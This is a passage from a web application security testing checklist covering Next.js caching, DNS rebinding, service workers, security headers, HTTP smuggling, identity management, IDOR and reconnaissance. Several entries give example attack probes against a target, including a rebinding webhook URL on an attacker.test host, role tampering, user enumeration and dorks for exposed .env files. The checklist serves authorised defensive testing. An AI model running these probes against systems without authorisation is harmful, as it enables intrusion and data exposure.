  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find secrets, internal fields and full database records that the server passes to Client Components, page props or action results.  
  *Steps:*
  1. Open the rendered HTML of each page. Search for fields that must stay on the server.
  2. Look at the React Server Component payloads, Pages Router data responses and Server Action responses.
  3. Search the client JavaScript for values from NEXT_PUBLIC_ variables. Make sure each one is public on purpose.
  4. Review the code that passes data to Client Components. Make sure it builds a narrow DTO and does not pass ORM records or session objects.
  5. Request the production site for .map files. Make sure source maps are off unless the owner accepted the exposure.
  6. Make sure the production service runs the optimized build and not next dev.
  *Example:* `curl -s https://target/page | grep -oE "(password|token|secret|apiKey)[^,]{0,60}"; curl -sI https://target/_next/static/chunks/main.js.map; grep -rn "NEXT_PUBLIC_" .env*`  
  *Expected:* Responses hold only fields the user may see. No secret is in client code, no source map is public, and the production server is not in development mode.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CONF-02; asvs: V13.4.2, V13.4.7; cheatsheet: Nextjs_Security_Cheat_Sheet; cwe: CWE-200, CWE-540

- [ ] **WEB-NODE-004** Test Next.js cache entries for cross-user and cross-tenant reuse  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find cached data that one user or tenant fills and another user or tenant reads.  
  *Steps:*
  1. List cached functions, ISR pages, getStaticProps pages and shared CDN rules. Note the audience of each one.
  2. Fill the cache as identity A. Request the same route and object identifiers as identity B.
  3. Change a role or tenant membership. Request the route again and look for old data.
  4. Look at the Cache-Control header of each getServerSideProps response with personal data. Make sure it is not shared.
  5. Make sure no cache key holds a raw cookie or bearer token.
  6. Call the revalidation handlers without credentials. Make sure they fail.
  *Example:* `curl -s -H "Cookie: session=<A>" https://target/account/42; curl -s -H "Cookie: session=<B>" https://target/account/42; curl -sI https://target/account/42 | grep -i cache-control`  
  *Expected:* Identity B never receives data of identity A. Each cache key holds only verified dimensions, permission changes take effect, and invalidation needs authorization.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-04; asvs: V14.2.5; cheatsheet: Nextjs_Security_Cheat_Sheet; cwe: CWE-524, CWE-639  
  *See:* WEB-CACHE-002

- [ ] **WEB-NODE-005** Test Node.js request size limits and event-loop blocking  
  *Severity if fail:* Medium | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find a Node.js server that large bodies or CPU-heavy requests can make unresponsive.  
  *Steps:*
  1. Find the body parser settings. Make sure the JSON and URL-encoded parsers have a size limit.
  2. Send a JSON body larger than the limit. Make sure the server returns a client error.
  3. Send a large body with a changed Content-Type header. Make sure the server still applies a limit.
  4. Look in the handlers for long synchronous work, such as large JSON parsing, sync crypto and unsafe regular expressions.
  5. Send one slow request. At the same time, send a health check and measure the latency.
  6. Make sure the server returns 503 or sheds load when the event loop is too slow.
  *Example:* `curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target/api -H "Content-Type: application/json" --data-binary @big.json; autocannon -c 20 -d 15 https://target/slow-route; clinic doctor -- node server.js`  
  *Expected:* Oversize bodies get a 413 response for every Content-Type. Slow requests do not block other requests, and the server sheds load when it is too busy.  
  *Refs:* owasp_top10: A06:2025; asvs: V15.2.2, V2.4.1; cheatsheet: Nodejs_Security_Cheat_Sheet; cwe: CWE-400, CWE-770, CWE-1333; capec: CAPEC-125, CAPEC-492  
  *See:* API-RES-003


## REBIND

- [ ] **WEB-REBIND-001** Test server-side fetch for DNS rebinding between check and connection  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find a server-side fetch that checks a host name once and then connects to another address after a second DNS answer.  
  *Steps:*
  1. Register the URL of your DNS name in the fetch feature while it resolves to a public address. Make sure the request works.
  2. Set the name to answer with a public address first and an internal address second, for example 127.0.0.1 or 169.254.169.254.
  3. Send the URL again many times. Look for a response that comes from the internal service.
  4. Review the code. Find out if the client resolves the name once, checks the IP and connects to that exact IP.
  5. Make sure the Host header and SNI keep the original host name when the client connects by IP.
  6. Make sure redirects get the same checks. Make sure the delivery worker cannot reach internal networks.
  *Example:* `a custom DNS server with TTL 0 that alternates 203.0.113.10 and 127.0.0.1; curl -X POST https://target/api/webhooks -d "{\"url\":\"https://rebind.attacker.test/hook\"}"`  
  *Expected:* The client validates the address it connects to, and a changed DNS answer gets no internal access. Redirects are checked, and workers have no route to internal services.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-INJT-19; asvs: V1.3.6, V13.2.4; cheatsheet: Webhook_Security_Cheat_Sheet; cwe: CWE-918, CWE-367; capec: CAPEC-275  
  *See:* API-SSRF-002, API-SSRF-004, API-SSRF-005

- [ ] **WEB-REBIND-002** Send unknown Host headers to internal and localhost web services  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find internal or local HTTP services that answer any Host value and so work for a DNS rebinding page.  
  *Steps:*
  1. Send a request to each service with the correct Host header. Note the response.
  2. Send the same request with Host set to an attacker domain, such as rebind.attacker.test.
  3. Send the same request with Host set to a random name and with an empty Host value.
  4. Make sure the service rejects each request whose Host is not on its allow-list.
  5. Check the DNS resolver for internal names. Make sure external names cannot resolve to internal addresses.
  6. Make sure the service needs authentication even when the request comes from localhost.
  *Example:* `curl -i http://127.0.0.1:8080/ -H "Host: rebind.attacker.test"; curl -i http://10.0.0.5/admin -H "Host: x"; dig +short internal-test.attacker.test @internal-resolver`  
  *Expected:* Requests with an unknown Host header get a 4xx response. The resolver blocks external names that point to internal addresses, and the service requires authentication.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-INJT-17; asvs: V13.2.4; cwe: CWE-346, CWE-1327; capec: CAPEC-275  
  *See:* LLM-MCP-005

- [ ] **WEB-REBIND-003** Test local network services for cross-site requests and preflight handling  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find services on loopback or a private network that act on a request from a public web page.  
  *Steps:*
  1. From the public test page, send a simple GET or POST request to the local service. Look at the log of the service.
  2. Look for state changes, such as a setting change or a command. A simple request needs no preflight.
  3. Send a preflight OPTIONS request with Access-Control-Request-Private-Network set to true and an Origin of the public site.
  4. Make sure the service does not answer the preflight with approval. A 50x answer or a missing header is safe.
  5. Make sure each state-changing action needs a token or credential that a foreign page cannot send.
  6. Make sure the service does not trust the access only because the request comes from the local machine.
  *Example:* `curl -i -X OPTIONS http://127.0.0.1:8080/api/set -H "Origin: https://public.attacker.test" -H "Access-Control-Request-Method: GET" -H "Access-Control-Request-Private-Network: true"`  
  *Expected:* The service refuses preflights from public origins. State-changing requests need a token or credential. A request from the local machine is not trusted by itself.  
  *Refs:* owasp_top10: A01:2025; asvs: V3.4.2; cwe: CWE-346, CWE-352; capec: CAPEC-275; other: WICG Private Network Access: https://wicg.github.io/private-network-access/


## SW

- [ ] **WEB-SW-001** Check service worker and web worker script origin, scope and input  
  *Severity if fail:* Medium | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find workers that load from the wrong origin, cover too many paths or run script built from user input.  
  *Steps:*
  1. Find all calls to navigator.serviceWorker.register and new Worker. Note the script URL and scope.
  2. Make sure each worker script comes from your own origin over HTTPS.
  3. Make sure the file name of the script changes with its content.
  4. Make sure the scope is as narrow as the application needs. Find any Service-Worker-Allowed response header and examine its value.
  5. Make sure the worker script is served with a JavaScript MIME type.
  6. Look for worker URLs, Blob scripts or importScripts calls that use user-supplied input. There must be none.
  7. Review the message handlers of web workers. Make sure they validate the messages and do not call eval on message data.
  8. On a host with content of many users, make sure one user cannot register a worker for the whole site.
  *Example:* `curl -sI https://target/sw.js | grep -i -E "content-type|service-worker-allowed|cache-control"; grep -rn "serviceWorker.register\|new Worker\|importScripts" src/; DevTools > Application > Service Workers`  
  *Expected:* Workers load from the own origin over HTTPS with a narrow scope. No worker script comes from user input, and worker messages are validated.  
  *Refs:* owasp_top10: A05:2025; wstg: WSTG-CLNT-06; asvs: V3.2.2; cheatsheet: HTML5_Security_Cheat_Sheet; cwe: CWE-94, CWE-829; other: W3C Service Workers, sections 6.1 and 6.5: https://www.w3.org/TR/service-workers/

- [ ] **WEB-SW-002** Check service worker caches for private data and removal at logout  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find a service worker that keeps private responses in the Cache API or stays active after logout or a compromise.  
  *Steps:*
  1. Log in and use the application. Open the Cache Storage view in the developer tools.
  2. Look for responses with personal data, tokens or account pages in the cache entries.
  3. Make sure the worker code excludes responses that carry sensitive data. The Cache API does not use HTTP cache headers.
  4. Log out. Make sure the private cache entries are deleted.
  5. Go offline and open a private page. Make sure no private data shows.
  6. Find the documented recovery process. Make sure it can unregister the worker and delete its caches.
  7. Make sure responses that hold private data still send Cache-Control with no-store.
  *Example:* `DevTools > Application > Cache Storage; navigator.serviceWorker.getRegistrations().then(r => r.length); caches.keys().then(console.log); curl -sI https://target/account | grep -i cache-control`  
  *Expected:* No sensitive response is in a worker cache. Logout deletes private entries, and a recovery process exists that unregisters the worker and removes its caches.  
  *Refs:* owasp_top10: A02:2025; wstg: WSTG-CLNT-12; asvs: V14.3.1, V14.3.2; cheatsheet: HTML5_Security_Cheat_Sheet; cwe: CWE-525, CWE-922  
  *See:* WEB-CLIENT-006


## HDR

- [ ] **WEB-HDR-001** Check the HTTP Strict Transport Security header and the preload state  
  *Severity if fail:* Medium | *Type:* Manual, Automated  
  *Objective:* Find missing or weak HSTS that leaves users open to downgrade and first-request attacks.  
  *Steps:*
  1. Request the HTTPS page with curl -I and read the Strict-Transport-Security header.
  2. Make sure max-age is at least one year and includeSubDomains is set when all subdomains use HTTPS.
  3. Request the HTTP URL and make sure it redirects with 301 or 308 to HTTPS.
  4. Make sure the redirect target also sends the HSTS header.
  5. Check the preload status of the domain at hstspreload.org.
  6. If a CDN or proxy sits in front, make sure the header survives.
  *Example:* `curl -sI https://example.com | grep -i strict-transport; curl -sI http://example.com | head -5; testssl.sh --headers example.com`  
  *Expected:* HSTS is on every HTTPS response with max-age of 31536000 or more. HTTP redirects to HTTPS. Preload is set only if all subdomains use HTTPS.  
  *Refs:* wstg: WSTG-CONF-07; owasp_top10: A04:2025, A02:2025; cheatsheet: HTTP_Strict_Transport_Security_Cheat_Sheet, HTTP_Headers_Cheat_Sheet; cwe: CWE-319; capec: CAPEC-94

- [ ] **WEB-HDR-002** Review the Content-Security-Policy for weak directives  
  *Severity if fail:* Medium | *Type:* Manual, Automated  
  *Objective:* Find CSP that is absent, report-only or weak and so does not stop XSS and framing.  
  *Steps:*
  1. Read the Content-Security-Policy and Content-Security-Policy-Report-Only headers on sensitive pages.
  2. Look for unsafe-inline, unsafe-eval, unsafe-hashes and wildcard sources.
  3. Look for missing default-src, object-src, base-uri and frame-ancestors.
  4. Make sure nonces are random and change in each response.
  5. Check strict-dynamic and Trusted Types settings.
  6. Make sure the policy is a header, not only a meta element.
  *Example:* `curl -sI https://example.com | grep -i content-security; Google CSP Evaluator https://csp-evaluator.withgoogle.com/`  
  *Expected:* An enforced CSP exists with no unsafe-inline or unsafe-eval for scripts, no wildcard sources, frame-ancestors set, and random nonces.  
  *Refs:* wstg: WSTG-CONF-12; owasp_top10: A02:2025; cheatsheet: HTTP_Headers_Cheat_Sheet; cwe: CWE-693, CWE-1021

- [ ] **WEB-HDR-003** Check other security headers and remove deprecated ones  
  *Severity if fail:* Low | *Type:* Manual, Automated  
  *Objective:* Find missing, wrong or deprecated security headers.  
  *Steps:*
  1. Fetch the response headers of the main page, a login page and an API response.
  2. Check X-Content-Type-Options: nosniff, Referrer-Policy and Permissions-Policy.
  3. Check clickjacking control with frame-ancestors or X-Frame-Options.
  4. Check Cross-Origin-Opener-Policy and Cross-Origin-Embedder-Policy where cross-origin isolation is needed.
  5. Flag X-XSS-Protection other than 0, X-Frame-Options ALLOW-FROM and Expect-CT.
  6. Look for duplicate or conflicting headers and headers in meta elements.
  *Example:* `curl -sI https://example.com; https://securityheaders.com/?q=example.com; zap-baseline.py -t https://example.com`  
  *Expected:* Required headers are present with safe values. Deprecated headers are removed or set to safe values. Clear-Site-Data is used only where needed.  
  *Refs:* wstg: WSTG-CONF-14; owasp_top10: A02:2025; cheatsheet: HTTP_Headers_Cheat_Sheet; cwe: CWE-693, CWE-1021


## HTTP

- [ ] **WEB-HTTP-001** Make sure every response has a correct Content-Type with charset  
  *Severity if fail:* Low | *Type:* Manual, Automated | *Level:* ASVS L1  
  *Objective:* Find responses with a missing or wrong Content-Type that lead to MIME sniffing or XSS.  
  *Steps:*
  1. Request each page type, API response, download and error page with curl -I.
  2. Look at the Content-Type header and the charset on text types.
  3. Compare the type with the real body, for example JSON that is sent as text/html.
  4. Look for X-Content-Type-Options: nosniff on the same responses.
  *Example:* `curl -sI https://example.com/ https://example.com/api/me | grep -i '^content-type'`  
  *Expected:* Each response with a body has a Content-Type that matches the body, with a charset on text types.  
  *Refs:* asvs: V4.1.1; cheatsheet: HTTP_Headers_Cheat_Sheet; cwe: CWE-436

- [ ] **WEB-HTTP-002** Make sure only user-facing endpoints redirect from HTTP to HTTPS  
  *Severity if fail:* Low | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find API and service endpoints that redirect HTTP to HTTPS and so hide clients that send data in clear text.  
  *Steps:*
  1. Send an HTTP request to the user-facing site and to each API or service host.
  2. Look at the status code. A browser endpoint redirects with 301 or 308.
  3. Make sure API and service endpoints refuse plain HTTP, or do not listen on port 80.
  4. Make sure the redirect target sends the HSTS header.
  *Example:* `curl -si http://example.com/; curl -si http://api.example.com/v1/status`  
  *Expected:* User-facing endpoints redirect to HTTPS. API and service endpoints do not redirect HTTP and give an error or no answer.  
  *Refs:* asvs: V4.1.2; wstg: WSTG-CRYP-03; cwe: CWE-319

- [ ] **WEB-HTTP-003** Make sure message signatures protect highly sensitive requests  
  *Severity if fail:* Info | *Type:* Manual, Code Review | *Level:* ASVS L3  
  *Objective:* Find high-value transactions that rely on transport security alone and have no per-message signature.  
  *Steps:*
  1. List the requests that are highly sensitive or pass through several systems.
  2. Read the design for the per-message signature method, for example HTTP Message Signatures or JWS.
  3. Change one field in a signed request and send it again.
  4. Replay a signed request after its validity time.
  *Example:* `Burp Repeater: edit the signed body, keep the Signature header, send, and look for a 401 or 400 answer.`  
  *Expected:* The server rejects changed and replayed signed messages. Signatures cover the sensitive request parts.  
  *Refs:* asvs: V4.1.5; cwe: CWE-345, CWE-347

- [ ] **WEB-HTTP-004** Test the HTTP request framing for request smuggling  
  *Severity if fail:* High | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find disagreement between front-end and back-end servers on where an HTTP message ends.  
  *Steps:*
  1. Run the Burp HTTP Request Smuggler or smuggler.py against the main host.
  2. Send CL.TE, TE.CL and TE.TE test requests with timing detection.
  3. Send HTTP/2 requests with a Content-Length that differs from the DATA frame length.
  4. Review that every component in the chain uses Transfer-Encoding before Content-Length in HTTP/1.x.
  5. Review that the application never sends a Content-Length that conflicts with the framing.
  *Example:* `python3 smuggler.py -u https://example.com/ ; Burp extension: HTTP Request Smuggler > Smuggle probe`  
  *Expected:* All components agree on message boundaries. Conflicting Content-Length and Transfer-Encoding requests are rejected.  
  *Refs:* asvs: V4.2.1, V4.2.2; cwe: CWE-444; capec: CAPEC-33  
  *See:* WEB-INJ-018

- [ ] **WEB-HTTP-005** Make sure HTTP/2 and HTTP/3 messages carry no connection-specific headers or CRLF  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L3  
  *Objective:* Find HTTP/2 or HTTP/3 downgrade and header injection through Transfer-Encoding and CR, LF or CRLF in header values.  
  *Steps:*
  1. Send an HTTP/2 request with a Transfer-Encoding header.
  2. Send HTTP/2 header names and values that contain CR, LF and CRLF.
  3. Look for the response header that the application sets from user input and test the same.
  4. Make sure the application does not send connection-specific headers in HTTP/2 responses.
  *Example:* `nghttp -v -H 'transfer-encoding: chunked' https://example.com/; Burp Repeater (HTTP/2) with %0d%0a in a header value`  
  *Expected:* The server rejects HTTP/2 and HTTP/3 messages with connection-specific headers or CR, LF or CRLF in field names or values.  
  *Refs:* asvs: V4.2.3, V4.2.4; cwe: CWE-113, CWE-93; capec: CAPEC-34

- [ ] **WEB-HTTP-006** Make sure outgoing URIs and headers stay within length limits  
  *Severity if fail:* Low | *Type:* Manual, Code Review | *Level:* ASVS L3  
  *Objective:* Find backend calls that build very long URIs or headers that the receiving component rejects or handles in an unsafe way.  
  *Steps:*
  1. Find backend calls that put user input in a URI, Authorization header or Cookie header.
  2. Send very long input to these fields.
  3. Look for error responses, truncated values or a bypass of security headers from the receiver.
  4. Review the code for length checks before a request is built.
  *Example:* `python3 -c "print('A'*70000)" | xargs -I{} curl -si 'https://example.com/search?q={}'`  
  *Expected:* The application checks the length of user input used in URIs and headers and returns a controlled error.  
  *Refs:* asvs: V4.2.5; cwe: CWE-20

- [ ] **WEB-HTTP-007** Make sure GraphQL cost and depth limits protect against expensive queries  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find GraphQL endpoints that accept deeply nested or very costly queries.  
  *Steps:*
  1. Find the GraphQL endpoint and send a query that nests the same relation to ten levels.
  2. Send a query with many aliases and a large list size.
  3. Send a batch of queries in one request.
  4. Look for rejection by depth limit, cost analysis, amount limit or query allowlist.
  5. Look at the response time and the server load.
  *Example:* `curl -s https://example.com/graphql -H 'Content-Type: application/json' -d '{"query":"{a:user{friends{friends{friends{friends{name}}}}}}"}'`  
  *Expected:* The server rejects over-deep or over-costly queries with a clear limit error. The service stays responsive.  
  *Refs:* asvs: V4.3.1; wstg: WSTG-APIT-99; cwe: CWE-400, CWE-770; capec: CAPEC-130

- [ ] **WEB-HTTP-008** Make sure GraphQL introspection and field suggestions are off in production  
  *Severity if fail:* Low | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find GraphQL schemas that leak to users through introspection or Did you mean hints.  
  *Steps:*
  1. Send an introspection query to the GraphQL endpoint.
  2. Send a query with a misspelled field name and read the error text.
  3. Look for GraphiQL, Playground or Voyager pages on the host.
  4. Look at the schema for sensitive fields such as passwordHash or apiKey.
  *Example:* `curl -s https://example.com/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}'; clairvoyance -u https://example.com/graphql`  
  *Expected:* Introspection is off and errors give no field suggestions, unless the API is for outside parties.  
  *Refs:* asvs: V4.3.2; wstg: WSTG-APIT-99; owasp_top10: A02:2025; cwe: CWE-200

- [ ] **WEB-HTTP-009** Test WebSocket transport, origin checking and session tokens  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Find WebSocket endpoints that use ws://, accept any Origin or use weak tokens.  
  *Steps:*
  1. Find WebSocket URLs in the traffic and the JavaScript.
  2. Make sure each URL uses wss://.
  3. Open the WebSocket handshake from a page on another origin, or with a changed Origin header.
  4. Look at how the connection is authenticated. Dedicated tokens must follow session rules.
  5. Make sure the token comes from the authenticated HTTPS session and cannot be reused after logout.
  *Example:* `wscat -c wss://example.com/ws -H 'Origin: https://evil.example'; Burp WebSocket history > Repeater`  
  *Expected:* All WebSocket connections use WSS. The handshake accepts only allowed origins. Tokens come from the authenticated HTTPS session.  
  *Refs:* asvs: V4.4.1, V4.4.2, V4.4.3, V4.4.4; cheatsheet: WebSocket_Security_Cheat_Sheet; cwe: CWE-1385, CWE-319  
  *See:* WEB-CLIENT-004


## IDM

- [ ] **WEB-IDM-001** Identify roles and try to switch to another role  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds role definitions that a user can change or guess, and roles with too many permissions.  
  *Steps:*
  1. Find all roles from documentation, developers, page comments and the JavaScript source.
  2. Look for role values in cookies, hidden fields, JWT claims and account variables.
  3. Change the role value in a request from a low-privilege account.
  4. Request /admin, /mod and /backups paths with the low-privilege account.
  5. Compare the permissions of each role with the needs of that role.
  *Example:* `Burp Repeater: change 'Cookie: role=user' to 'role=admin' or 'isAdmin=True'; also run Autorize with the low-privilege session cookie while you browse as admin.`  
  *Expected:* The server ignores client-supplied role values. A low-privilege user cannot reach another role. No role has more permissions than it needs, and sensitive admin actions need MFA or a second approver.  
  *Refs:* wstg: WSTG-IDNT-01; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-269, CWE-266, CWE-639

- [ ] **WEB-IDM-002** Check identity requirements and abuse of the registration process  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds registration flows that grant access or privileged roles without proper identity checks.  
  *Steps:*
  1. Register an account and list the identity data that the application asks for.
  2. Register the same person twice with different email addresses.
  3. Try to register for a role or permission that is not meant for public users.
  4. Register with an email address in a trusted domain that you do not control.
  5. Register with a look-alike domain such as notexample.org and examine the granted role.
  6. Change the identity data in the registration request with a proxy and send it again.
  *Example:* `POST /register with email=attacker@notexample.org and role=admin in Burp Repeater; compare the account role after the confirmation step.`  
  *Expected:* Identity requirements match the sensitivity of the data. The application checks ownership of the email address before it grants any role. Look-alike domains and forged identity data are rejected.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-IDNT-02; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-287, CWE-290

- [ ] **WEB-IDM-003** Check who can provision and de-provision accounts  
  *Severity if fail:* High | *Type:* Manual  
  *Objective:* Finds provisioning flows that let a user create accounts with more privilege than their own.  
  *Steps:*
  1. List the roles that can create or delete accounts.
  2. As an administrator, create a new administrator and a user with higher privileges than your own.
  3. As a non-administrator, send the same create-account request.
  4. Try to de-provision your own account and another user's account.
  5. Look at what happens to the files and data of a removed user.
  *Example:* `POST /admin/addUser (userID=fakeuser&role=3&group=grp001) with a non-admin session cookie in Burp Repeater.`  
  *Expected:* Only authorized roles can provision accounts. No user can create an account with more privilege than their own. De-provisioning needs authorization, and owned data is deleted or transferred by rule.  
  *Refs:* wstg: WSTG-IDNT-03; cheatsheet: Authorization_Cheat_Sheet; cwe: CWE-269, CWE-266, CWE-862

- [ ] **WEB-IDM-004** Look for account enumeration in login and registration  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds different messages, status codes, titles, redirects or timing that reveal valid user names.  
  *Steps:*
  1. Send a login with a valid user and a wrong password. Record the status, length, title and time.
  2. Send a login with an unknown user. Compare the response with the first one.
  3. Send a login with a valid user and an empty password.
  4. Register with a user name or email address that already exists. Compare the message with a new one.
  5. Look at the URL and redirect parameters for error codes that change with the user.
  6. Send 20 requests for each case and compare the average response time.
  *Example:* `ffuf -w users.txt -X POST -d 'username=FUZZ&password=x' -u https://target/login -mc all -fs <size of generic response> ; compare response times in Burp Intruder.`  
  *Expected:* Every failed login gives the same message, status code, length and a similar time. Registration does not show whether an email address or user name exists.  
  *Refs:* owasp_top10: A07:2025; wstg: WSTG-IDNT-04, WSTG-IDNT-05; asvs: V6.3.8; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-204, CWE-203, CWE-208, CWE-209

- [ ] **WEB-IDM-005** Try to register or rename to a reserved user name  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds registration and profile pages that allow staff impersonation with names such as admin.  
  *Steps:*
  1. Register as a new user with the name admin. Read the response.
  2. Repeat with administrator, moderator, Admin and ADMIN.
  3. Log in as a normal user and open the profile edit page.
  4. Change the user name to each reserved name and save.
  *Example:* `POST /register username=AdMiN in Burp Repeater; then POST /profile/update username=administrator with a normal session.`  
  *Expected:* The application rejects every reserved name and every case variant, both at registration and at profile change.  
  *Refs:* wstg: WSTG-IDNT-04, WSTG-IDNT-05; cheatsheet: Authentication_Cheat_Sheet; cwe: CWE-290

- [ ] **WEB-IDM-006** Check that user names and user IDs are not predictable  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Finds sequential or pattern-based user names that make guessing and credential stuffing easier.  
  *Steps:*
  1. Collect user names or IDs from five new accounts and from public pages.
  2. Look for patterns such as sequential numbers or first initial plus last name.
  3. Generate five names from the pattern. Check if the application accepts them as valid.
  4. Check if user IDs are random and not linked to a card number or real name.
  *Example:* `for i in $(seq 100 120); do curl -s -o /dev/null -w '%{http_code} CN000$i\n' https://target/profile/CN000$i; done`  
  *Expected:* User IDs are random and not guessable from a pattern. Generated names do not reveal valid accounts.  
  *Refs:* wstg: WSTG-IDNT-04, WSTG-IDNT-05; cheatsheet: Authentication_Cheat_Sheet, Credential_Stuffing_Prevention_Cheat_Sheet; cwe: CWE-330, CWE-340


## IDOR

- [ ] **WEB-IDOR-001** Test access to other users' objects by changing the reference  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds objects that a user can read by changing an ID in the request.  
  *Steps:*
  1. Create user A and user B. Create objects for each, such as invoices.
  2. Map every place where input refers to an object: URL, body, header and cookie.
  3. Log in as A and request the objects of B by changing the reference.
  4. Compare the response with the response for the owner.
  *Example:* `curl -b 'session=<userA>' 'https://foo.bar/somepage?invoice=<id of B>' ; Burp Autorize with the session of user A.`  
  *Expected:* The server returns 403 or 404 for objects of other users. It checks ownership on every request.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-04, WSTG-ATHZ-02; asvs: V8.2.2; cheatsheet: Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet, Authorization_Cheat_Sheet; cwe: CWE-639, CWE-566, CWE-863; capec: CAPEC-1

- [ ] **WEB-IDOR-002** Test write, delete and export operations for IDOR  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds update and delete calls that do not check ownership.  
  *Steps:*
  1. List all operations that take an object reference: read, create, update, delete, export.
  2. As user A send each operation with the object ID of user B.
  3. Check the effect as user B.
  4. Test all HTTP methods and bulk calls.
  *Example:* `curl -X DELETE -b 'session=<userA>' https://target/api/documents/<id of B>`  
  *Expected:* No operation acts on an object of another user. Every method checks ownership.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-04; asvs: V8.2.2; cheatsheet: Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet; cwe: CWE-639, CWE-862

- [ ] **WEB-IDOR-003** Test operations that take a user parameter  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds password change, profile change or other functions that act on a user named in the request.  
  *Steps:*
  1. Find requests with user, uid, account or email parameters.
  2. Log in as A and replace the value with the name of B.
  3. Use multi-step flows: change the value in each step.
  4. Check split references, where the object uses two parameters.
  *Example:* `Burp Repeater: GET /changepassword?user=userB with the session of user A.`  
  *Expected:* The server takes the user from the session and ignores or rejects other values.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-04; asvs: V8.2.2; cheatsheet: Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet; cwe: CWE-639, CWE-620

- [ ] **WEB-IDOR-004** Test file and resource references  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds file names or IDs that give access to other users' files.  
  *Steps:*
  1. Find parameters that name files or images.
  2. Upload a file as A. Note its reference.
  3. Request it as B and with no session.
  4. Try names of other files, also from other folders.
  *Example:* `curl -i -b 'session=<userB>' 'https://foo.bar/showImage?img=img00011'`  
  *Expected:* Files are served only to users who own them or have a right. Direct links do not skip the check.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-04; asvs: V8.2.2; cheatsheet: Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet; cwe: CWE-639, CWE-425

- [ ] **WEB-IDOR-005** Check that hard-to-guess IDs are not the only protection  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds objects protected only by secret-looking IDs such as UUIDs.  
  *Steps:*
  1. Create an object as A and note its UUID or slug.
  2. Find the UUID in lists, emails, logs or shared links.
  3. Request the object as B with the known UUID.
  4. Check for sequential or time-based IDs.
  *Example:* `curl -b 'session=<userB>' https://target/api/docs/550e8400-e29b-41d4-a716-446655440000`  
  *Expected:* The server checks permission for every object, also when the ID is a UUID. Random IDs are only extra defense.  
  *Refs:* owasp_top10: A01:2025; wstg: WSTG-ATHZ-04; cheatsheet: Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet, Authorization_Cheat_Sheet; cwe: CWE-639, CWE-340


## INFO

- [ ] **WEB-INFO-001** Search for sensitive information about the target in search engines and archives  
  *Severity if fail:* Low | *Type:* Manual, Automated  
  *Objective:* Find design, configuration or credential data that search engines, caches or archives expose about the target.  
  *Steps:*
  1. Search with the site: operator on at least two search engines for the target domain.
  2. Search for dorks such as filetype, inurl and intitle terms for config files, logins and error text.
  3. Search Shodan or Censys for the target IP ranges and certificates.
  4. Collect old URLs from the Wayback Machine with gau, waybackurls or waymore.
  5. Look at the results for staging sites, backups, credentials, private keys and internal diagrams.
  *Example:* `site:example.com (filetype:env OR filetype:sql OR inurl:admin); gau example.com --threads 8 | tee gau.txt; waybackurls example.com | unfurl --unique paths`  
  *Expected:* No search engine, cache or archive result shows credentials, private keys, internal documents, test or staging sites, or revealing error text.  
  *Refs:* wstg: WSTG-INFO-01; cwe: CWE-200; capec: CAPEC-116

- [ ] **WEB-INFO-002** Fingerprint the web server and framework from headers, cookies and errors  
  *Severity if fail:* Low | *Type:* Manual, Automated | *Level:* ASVS L3  
  *Objective:* Find server, framework and component names or versions that headers, cookies, markup or default pages disclose.  
  *Steps:*
  1. Send curl -I to the main page and to a 404 page and read the Server and X-Powered-By headers.
  2. Send a malformed request line to the server and compare the default error page.
  3. Look at cookie names, HTML meta tags, comment banners and file names for framework markers.
  4. Run WhatWeb or httpx with tech detection against the host.
  5. Compare the result with the version that the owner expects.
  *Example:* `curl -sI https://example.com | grep -iE 'server|x-powered-by|x-aspnet'; printf 'GET / SANTA/1.1\r\n\r\n' | openssl s_client -quiet -connect example.com:443; whatweb -a 3 https://example.com`  
